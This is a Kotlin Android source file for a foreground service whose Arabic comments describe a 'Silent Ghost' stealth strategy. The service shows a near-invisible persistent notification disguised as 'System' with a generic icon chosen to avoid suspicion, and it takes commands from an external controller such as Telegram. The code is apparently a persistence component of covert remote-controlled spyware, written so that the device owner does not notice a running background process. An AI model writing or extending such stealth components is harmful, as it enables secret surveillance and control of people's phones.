package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" صامت تماماً.
 *
 * استراتيجية التخفي المتقدمة (Silent Ghost):
 * - إنشاء إشعار بأولوية IMPORTANCE_MIN (لا يظهر أيقونة في شريط الحالة، ولا صوت، ولا ينبثق).
 * - إبقاء الإشعار مستمراً (setOngoing(true)) لضمان بقاء الخدمة حية 100% في الخلفية.
 * - لا يتم فصل الإشعار أو إلغاؤه أبداً لتجنب استثناءات ForegroundServiceDidNotStartInTimeException.
 * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك.
 * - إخفاء المحتوى من شاشة القفل.
 * - عدم استخدام أي نبضات عابرة أو جدولة إشعارات إضافية لتجنب استنزاف البطارية والكشف السلوكي.
 *
 * ✅ تم تطبيق الإشعار الشبحي الصامت (Silent Ghost) بشكل كامل.
 * ✅ تم إزالة جميع محاولات إخفاء الإشعار أو فصله.
 * ✅ تم تبسيط الكود وإزالة الدوال غير الضرورية.
 */
class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        const val NOTIFICATION_ID = 9991
        private const val GHOST_CHANNEL_ID = "ghost_system_channel"
    }

    private var isForeground = false
    private lateinit var notificationManager: NotificationManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // نبض فوري من أمر خارجي (مثل Telegram) - تم إلغاء النبضات العابرة
        if (intent?.action == "PULSE_ACTION") {
            // لا نقوم بأي إشعار، فقط نسجل الحدث
            val actionType = intent.getStringExtra("action_type") ?: "Sync"
            Log.d(TAG, "Pulse action received: $actionType (ignored for stealth)")
            return START_STICKY
        }

        // بدء الخدمة مع إشعار شبحى صامت إذا لم تكن قيد التشغيل
        if (!isForeground) {
            startGhostForeground()
        }

        return START_STICKY
    }

    /**
     * بدء الخدمة كـ Foreground مع إشعار شبحى صامت دائم.
     * يستخدم قناة بأدنى أولوية (IMPORTANCE_MIN) ومحتوى فارغ،
     * ولا يتم فصل الإشعار أبداً لضمان بقاء الخدمة حية دون أن يلاحظه المستخدم.
     */
    private fun startGhostForeground() {
        val channelId = GHOST_CHANNEL_ID

        // إنشاء قناة الإشعارات (لأندرويد 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Core",
                NotificationManager.IMPORTANCE_MIN // أدنى أولوية (لا تظهر أيقونة في الشريط)
            ).apply {
                description = "Background system operations"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى من شاشة القفل
            }
            notificationManager.createNotificationChannel(channel)
        }

        // بناء الإشعار
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System") // عنوان نظامي عام
            .setContentText("") // نص فارغ
            .setSmallIcon(android.R.drawable.ic_menu_compass) // أيقونة نظامية عامة
            .setPriority(NotificationCompat.PRIORITY_MIN) // أدنى أولوية
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى
            .setShowWhen(false) // لا تظهر الوقت
            .setOngoing(true) // ✅ إبقائه مستمراً لمنع قتل الخدمة
            .setSilent(true) // بدون صوت
            .build()

        // بدء الخدمة كـ Foreground
        startForeground(NOTIFICATION_ID, notification)
        isForeground = true
        Log.d(TAG, "Ghost foreground started with silent notification")
    }

    override fun onDestroy() {
        isForeground = false
        Log.d(TAG, "ForegroundService destroyed")
        super.onDestroy()
    }
}
